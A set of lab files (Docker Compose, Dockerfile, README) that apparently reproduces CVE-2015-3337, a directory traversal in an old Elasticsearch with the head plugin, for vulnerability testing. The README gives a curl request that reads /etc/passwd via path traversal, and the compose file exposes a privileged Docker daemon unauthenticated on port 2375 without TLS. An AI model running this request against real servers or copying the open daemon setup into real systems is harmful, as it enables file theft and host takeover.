{
    "files": [
        {
            "location": "./../../dockers/CVE-2015-3337/custom_no_tool/docker-compose.yml",
            "content": "services:\n  dind:\n    image: docker:20.10-dind\n    privileged: true\n    ports:\n      - \"2375:2375\"\n    environment:\n      - DOCKER_TLS_CERTDIR=\n    command: [\"--host=tcp://0.0.0.0:2375\", \"--tls=false\"]\n\n  elasticsearch:\n    build:\n      context: .\n      dockerfile: Dockerfile\n    container_name: elasticsearch\n    environment:\n      - discovery.type=single-node\n      - \"ES_JAVA_OPTS=-Xms512m -Xmx512m\"\n      - \"network.host=0.0.0.0\"\n    ports:\n      - \"9200:9200\"\n      - \"9300:9300\"\n    ulimits:\n      memlock:\n        soft: -1\n        hard: -1"
        },
        {
            "location": "./../../dockers/CVE-2015-3337/custom_no_tool/Dockerfile",
            "content": "FROM docker.elastic.co/elasticsearch/elasticsearch:1.4.4\nRUN apt-get update && apt-get install -y wget && \\\n    /usr/share/elasticsearch/bin/plugin install mobz/elasticsearch-head/1.4.0 && \\\n    chown -R elasticsearch:elasticsearch /usr/share/elasticsearch && \\\n    apt-get clean && rm -rf /var/lib/apt/lists/*"
        },
        {
            "location": "./../../dockers/CVE-2015-3337/custom_no_tool/README.md",
            "content": "This Docker Compose setup runs two services:\n\n1. **Docker-in-Docker (dind)** \u2013 based on `docker:20.10-dind`. The daemon is exposed on port **2375** without TLS, allowing unauthenticated remote API access. The daemon is started with an explicit command to listen on the TCP socket (`--host=tcp://0.0.0.0:2375`) and TLS disabled (`--tls=false`).\n\n2. **Elasticsearch** \u2013 a custom image built from the vulnerable `elasticsearch:1.4.4` base (pulled from Elastic's registry) and extended with the `elasticsearch-head` plugin version `1.4.0`. The service listens on the standard ports **9200** (HTTP) and **9300** (transport). It is configured for single\u2011node operation and disables memory locking limits to match the requirements of the older ES releases.\n\nBoth containers are launched on the default Docker Compose network, allowing you to reproduce the directory\u2011traversal scenario described in CVE\u20112015\u20113337. After running:\n\n```bash\ndocker compose up -d\n```\n\nyou can test the vulnerability with:\n\n```bash\ncurl http://localhost:9200/_plugin/head/../../../etc/passwd\n```\n\nIf the plugin is correctly installed, the server will return the contents of `/etc/passwd`, demonstrating the vulnerability.\n\nNo additional manual setup is required; the `docker compose up` command builds the custom Elasticsearch image, starts both services, and exposes them on the host ports indicated above."
        }
    ],
    "directory_tree": "./../../dockers/CVE-2015-3337/custom_no_tool"
}